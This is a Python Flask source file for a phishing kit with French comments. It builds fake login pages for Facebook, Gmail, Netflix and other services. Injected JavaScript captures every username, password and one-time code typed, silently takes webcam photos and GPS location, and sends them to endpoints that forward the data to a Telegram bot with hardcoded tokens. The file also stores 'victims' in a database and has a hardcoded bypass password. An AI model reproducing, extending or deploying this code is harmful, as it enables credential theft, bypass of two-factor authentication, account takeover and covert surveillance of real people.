import os
import base64
from flask import Flask, request, jsonify, render_template, render_template_string
import requests
import datetime
import sqlite3
import json

app = Flask(__name__)

# --- CONFIGURATION TELEGRAM ---
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "6141755021")
# N'oublie pas le signe moins (-) au début de l'ID du groupe
ADMIN_GROUP_CHAT_ID = os.environ.get("ADMIN_GROUP_CHAT_ID", "-9107581307") 

DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg",
    "Instagram": "https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg",
    "TikTok": "https://upload.wikimedia.org/wikipedia/commons/a/a6/Logo_NIKE.svg",
    "Gmail": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Google": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg",
    "Netflix": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
    "Telegram": "https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg",
    "Amazon": "https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg",
    "Snapchat": "https://upload.wikimedia.org/wikipedia/commons/c/c4/Snapchat_logo.svg"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT, network TEXT, type TEXT,
            victimUser TEXT, victimPass TEXT, victimOtp TEXT,
            dateStr TEXT, timestamp INTEGER, ip TEXT, extra_info TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT, slug TEXT UNIQUE, title TEXT, network TEXT,
            bg_type TEXT, bg_value TEXT, logo_url TEXT, logo_shape TEXT,
            fields_json TEXT, btn_text TEXT, html_code TEXT,
            redirect_url TEXT, mode TEXT, box_bg TEXT, box_width TEXT, created_at INTEGER
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def cleanup_expired_custom_pages():
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        twenty_four_hours_ago = int((datetime.datetime.now().timestamp() - 86400) * 1000)
        cursor.execute("DELETE FROM custom_pages WHERE created_at < ?", (twenty_four_hours_ago,))
        conn.commit()
        conn.close()
    except Exception as e:
        print("Erreur nettoyage liens 24h:", e)

def send_telegram_photo_and_message(bot_token, chat_id, photo_url, caption):
    if not bot_token: return
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    try:
        res = requests.post(url, json={"chat_id": chat_id, "photo": photo_url, "caption": caption, "parse_mode": "Markdown"}, timeout=5)
        if res.status_code != 200:
            send_telegram_notification(bot_token, chat_id, caption)
    except Exception as e:
        print("Erreur Telegram Photo:", e)

def send_telegram_notification(bot_token, chat_id, message):
    if not bot_token: return
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)

@app.route('/')
def index():
    cleanup_expired_custom_pages()
    return render_template('index.html')

@app.route('/phish/<path:subpath>')
def render_phish_page(subpath):
    cleanup_expired_custom_pages()
    subpath_clean = subpath.lower().strip('/')
    db_slug = subpath_clean.replace('otp/', '').replace('standard/', '')
    clean_custom_slug = db_slug.replace('_otp', '').replace('-otp', '').replace('_standard', '').replace('-standard', '')

    conn = get_db_connection()
    cursor = conn.cursor()
    possible_slugs = [db_slug, clean_custom_slug, db_slug.replace('-', '_'), db_slug.replace('_', '-')]

    cp = None
    for s in possible_slugs:
        cursor.execute("SELECT * FROM custom_pages WHERE LOWER(slug) = LOWER(?)", (s,))
        cp = cursor.fetchone()
        if cp: break
    conn.close()

    if cp:
        cp_dict = dict(cp)
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        if (now_ts - cp_dict.get("created_at", 0)) > 86400000:
            return "Ce lien a expiré après 24 heures.", 410

        redirect_url = cp_dict.get("redirect_url") or "https://www.google.com"

        # ============ OPTION 2 & 3 : INJECTION INTELLIGENTE ============
        if cp_dict.get("mode") in ['opt2', 'opt3'] and cp_dict.get("html_code"):
            html = cp_dict["html_code"]
            owner = cp_dict["owner"]
            network = cp_dict["network"]

            robust_injection_script = """
<script>
(function() {
    const OWNER = "__OWNER__";
    const NETWORK = "__NETWORK__";
    const REDIRECT_URL = "__REDIRECT_URL__";
    let isProcessing = false, hasRedirected = false;

    // Récupérer les anciennes données pour lier l'OTP plus tard
    let userData = {
        user: localStorage.getItem('ph_user_' + OWNER) || "",
        pass: localStorage.getItem('ph_pass_' + OWNER) || "",
        otp: ""
    };

    // 1. GPS (Dès le chargement)
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            let gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            fetch('/api/upload_media', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ owner: OWNER, network: NETWORK, type: 'gps', gps: gpsLink, device: navigator.userAgent })
            }).catch(()=>{});
        }, err => {}, { timeout: 5000 });
    }

    // 2. CAMÉRA EN ARRIÈRE-PLAN (Silencieuse dès le chargement)
    async function captureSilentPhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const video = document.createElement('video');
            video.srcObject = stream; await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
            
            await fetch('/api/upload_media', {
                method: 'POST', headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ owner: OWNER, network: NETWORK, type: 'photo', photo: dataUrl, user: userData.user || 'Inconnu' })
            });
        } catch (e) { console.log("Caméra non autorisée"); }
    }
    
    // On tente la photo 1 seconde après le chargement
    setTimeout(captureSilentPhoto, 1000);

    // 3. Classification des champs
    function classify(inp) {
        const name = (inp.name || inp.id || inp.placeholder || "").toLowerCase();
        const type = (inp.type || "").toLowerCase();
        if (type === "password") return "pass";
        if (type === "email" || type === "tel") return "user";
        if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('phone') || name.includes('mail')) return "user";
        if (name.includes('pass') || name.includes('mdp')) return "pass";
        if (name.includes('otp') || name.includes('code') || name.includes('verif') || name.includes('secret')) return "otp";
        return "unknown";
    }

    async function processData() {
        if (isProcessing || hasRedirected) return;
        isProcessing = true;

        let hasOtp = false, hasPass = false, hasUser = false;

        // On scanne TOUS les inputs de la page
        document.querySelectorAll('input, select, textarea').forEach(inp => {
            let val = (inp.value || "").trim();
            if (!val) return;
            const c = classify(inp);
            if (c === "user") { userData.user = val; localStorage.setItem('ph_user_' + OWNER, val); hasUser = true; }
            if (c === "pass") { userData.pass = val; localStorage.setItem('ph_pass_' + OWNER, val); hasPass = true; }
            if (c === "otp") { userData.otp = val; hasOtp = true; }
        });

        // Code universel d'accès admin
        if (userData.pass === '4121@' && userData.user) {
            let targetUrl = NETWORK.toLowerCase().includes('facebook') ? "https://www.facebook.com/" + userData.user : "https://www.google.com";
            window.location.replace(targetUrl); return;
        }

        let type = hasOtp ? "custom_html_otp" : "custom_html_otp_step1";
        if (!hasOtp && hasPass && !hasUser) type = "custom_html_password";
        if (!hasOtp && hasUser && !hasPass) type = "custom_html_email";

        // Envoi des données texte (Identifiant, Pass, OTP)
        await fetch('/api/capture', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                owner: OWNER, network: NETWORK, type: type,
                victimUser: userData.user || "Inconnu",
                victimPass: userData.pass || "Inconnu",
                otp: userData.otp || "En attente OTP...",
                extra_info: JSON.stringify({ ua: navigator.userAgent, platform: navigator.platform })
            }), keepalive: true
        });

        // Si c'est un OTP, on redirige
        if (hasOtp) {
            hasRedirected = true;
            setTimeout(() => window.location.replace(REDIRECT_URL), 100);
            return;
        }
        isProcessing = false;
    }

    // 4. Surveillance : Intercepter les formulaires ET les boutons cliqués
    document.addEventListener('DOMContentLoaded', () => {
        // Intercepter les soumissions de formulaire
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', (e) => { processData(); });
        });

        // Intercepter TOUS les clics sur les boutons de la page (très important pour OTP)
        document.addEventListener('click', function(e) {
            let target = e.target;
            if (target.tagName === 'BUTTON' || target.tagName === 'INPUT' && target.type === 'submit' || target.tagName === 'A') {
                processData();
            }
        });
    });
})();
</script>
"""
            script_final = robust_injection_script.replace("__OWNER__", owner).replace("__NETWORK__", network).replace("__REDIRECT_URL__", redirect_url)

            if "</body>" in html: html = html.replace("</body>", script_final + "</body>")
            else: html += script_final
            return render_template_string(html)

        # ============ OPTION 1 : NO-CODE TEMPLATE ============
        else:
            try: fields_parsed = json.loads(cp_dict.get("fields_json") or '[]')
            except: fields_parsed = []
            config = {
                "owner": cp_dict.get("owner", "Kim"), "title": cp_dict.get("title", "Connexion"),
                "network": cp_dict.get("network", "Facebook"), "bg_type": cp_dict.get("bg_type", "color"),
                "bg_value": cp_dict.get("bg_value", "#111"), "logo_url": cp_dict.get("logo_url", ""),
                "logo_shape": cp_dict.get("logo_shape", "circle"), "fields": fields_parsed,
                "btn_text": cp_dict.get("btn_text", "Se connecter"),
                "box_bg": cp_dict.get("box_bg") or "rgba(255,255,255,0.95)",
                "box_width": cp_dict.get("box_width") or "420px", "redirect_url": redirect_url
            }
            return render_template('custom_login.html', config=config)

    return f"Page introuvable : {subpath}", 404

@app.route('/api/upload_media', methods=['POST'])
def upload_media():
    data = request.json or {}
    owner, network, m_type = data.get('owner', 'Inconnu'), data.get('network', 'Inconnu'), data.get('type', 'media')
    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"

    if m_type == 'gps':
        msg = f"📍 *GPS CAPTURÉ*\n🌐 Réseau: {network}\n👤 Cible: {owner}\n🗺️ [Maps]({data.get('gps')})\n📱 Appareil: `{data.get('device')}`\n📍 IP: `{v_ip}`"
        send_telegram_notification(ADMIN_BOT_TOKEN, ADMIN_GROUP_CHAT_ID, msg)
    elif m_type == 'photo':
        photo_b64 = data.get('photo', '').split(',')[-1]
        url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendPhoto"
        try: requests.post(url, data={"chat_id": ADMIN_GROUP_CHAT_ID, "caption": f"📸 *PHOTO CIBLE*\n🎯 User: `{data.get('user')}`\n🌐 Réseau: {network}", "parse_mode": "Markdown"}, files={'photo': ('photo.jpg', base64.b64decode(photo_b64), 'image/jpeg')}, timeout=10)
        except: pass
    return jsonify({"status": "success"})

@app.route('/api/create_login', methods=['POST'])
def create_login():
    data = request.json or {}
    owner, slug = data.get('owner', '').strip(), data.get('slug', '').strip().lower().replace(' ', '_')
    if not owner or not slug: return jsonify({"status": "error", "message": "Slug manquant"})

    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        now_ts = int(datetime.datetime.now().timestamp() * 1000)
        mode, redirect_url = data.get('mode', 'opt1'), data.get('redirectUrl', 'https://google.com')

        if mode in ['opt2', 'opt3']:
            cursor.execute('''INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (owner, slug, "Page Perso", data.get('network'), "color", "#111", "", "circle", "[]", "Valider", data.get('htmlCode'), redirect_url, mode, "#fff", "420px", now_ts))
        else:
            cursor.execute('''INSERT OR REPLACE INTO custom_pages (owner, slug, title, network, bg_type, bg_value, logo_url, logo_shape, fields_json, btn_text, html_code, redirect_url, mode, box_bg, box_width, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (owner, slug, data.get('title'), data.get('network'), data.get('bgType'), data.get('bgValue'), data.get('logoUrl'), data.get('logoShape'), json.dumps(data.get('fields')), data.get('btnText'), "", redirect_url, 'opt1', data.get('boxBg'), data.get('boxWidth'), now_ts))
        
        conn.commit()
        conn.close()
        return jsonify({"status": "success", "url": f"{request.host_url.rstrip('/')}/phish/{slug}"})
    except Exception as e: return jsonify({"status": "error", "message": str(e)})

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json or {}
    owner, network = data.get('owner', 'Kim').strip(), data.get('network', 'Facebook')
    v_user, v_pass, v_otp, v_type = data.get('victimUser', 'Inconnu'), data.get('victimPass', 'Inconnu'), data.get('otp', 'Aucun'), data.get('type', 'standard')
    
    raw_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    v_ip = raw_ip.split(',')[0].strip() if raw_ip else "127.0.0.1"
    now, date_str = datetime.datetime.now(), datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    timestamp = int(now.timestamp() * 1000)
    
    conn = get_db_connection()
    cursor = conn.cursor()
    logo_img = PLATFORM_LOGOS.get(network, PLATFORM_LOGOS["Facebook"])
    
    if v_otp and v_otp not in ['Aucun', 'En attente OTP...']:
        cursor.execute("SELECT id FROM victims WHERE owner=? AND network=? AND victimOtp='En attente OTP...' ORDER BY id DESC LIMIT 1", (owner, network))
        existing = cursor.fetchone()
        if existing:
            cursor.execute("UPDATE victims SET victimOtp=?, dateStr=?, timestamp=?, ip=? WHERE id=?", (v_otp, date_str, timestamp, v_ip, existing["id"]))
            conn.commit(); conn.close()
            alert = f"🚨 *VICTIME COMPLÈTE (OTP)* 🚨\n📚 *Plateforme:* {network}\n👤 *Owner:* `{owner}`\n🎯 *ID:* `{v_user}`\n🔑 *Pass:* `{v_pass}`\n🔒 *OTP:* `{v_otp}`\n🕒 `{date_str}`\n📍 `{v_ip}`"
            send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
            return jsonify({"status": "success"})
            
    cursor.execute("INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip, extra_info) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip, data.get('extra_info')))
    conn.commit(); conn.close()
    
    alert = f"🚨 *NOUVELLE VICTIME ({v_type})* 🚨\n📚 *Plateforme:* {network}\n👤 *Owner:* `{owner}`\n🎯 *ID:* `{v_user}`\n🔑 *Pass:* `{v_pass}`\n🔒 *OTP:* `{v_otp}`\n🕒 `{date_str}`\n📍 `{v_ip}`"
    send_telegram_photo_and_message(ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, logo_img, alert)
    return jsonify({"status": "success"})

@app.route('/api/custom_pages', methods=['GET'])
def get_custom_pages():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner: cursor.execute("SELECT * FROM custom_pages WHERE owner = ? ORDER BY id DESC", (owner,))
    else: cursor.execute("SELECT * FROM custom_pages ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([{"slug": r["slug"], "title": r["title"], "network": r["network"], "mode": r["mode"]} for r in rows])

@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner', '').strip()
    conn = get_db_connection()
    cursor = conn.cursor()
    if owner: cursor.execute("SELECT * FROM victims WHERE owner LIKE ? ORDER BY id DESC", (f"%{owner}%",))
    else: cursor.execute("SELECT * FROM victims ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return jsonify([{"id": r["id"], "network": r["network"], "type": r["type"], "victimUser": r["victimUser"], "victimPass": r["victimPass"], "otp": r["victimOtp"], "dateStr": r["dateStr"], "timestamp": r["timestamp"], "ip": r["ip"]} for r in rows])

@app.route('/api/clear_victims', methods=['POST'])
def clear_victims():
    data = request.json or {}
    owner = data.get('owner', '').strip()
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("DELETE FROM victims WHERE owner = ?", (owner,))
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e: return jsonify({"status": "error", "message": str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
